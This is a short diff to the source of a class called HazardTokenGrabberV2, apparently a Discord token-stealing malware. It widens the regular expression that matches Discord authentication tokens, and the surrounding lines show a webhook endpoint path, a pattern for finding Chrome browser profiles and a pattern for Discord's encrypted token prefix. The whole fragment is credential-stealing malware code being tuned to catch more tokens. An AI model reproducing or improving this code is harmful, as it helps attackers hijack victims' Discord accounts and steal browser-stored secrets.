@@ -195,7 +195,7 @@ class HazardTokenGrabberV2(Functions):
 
         self.hook_reg = "api/webhooks"
         self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regex = r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
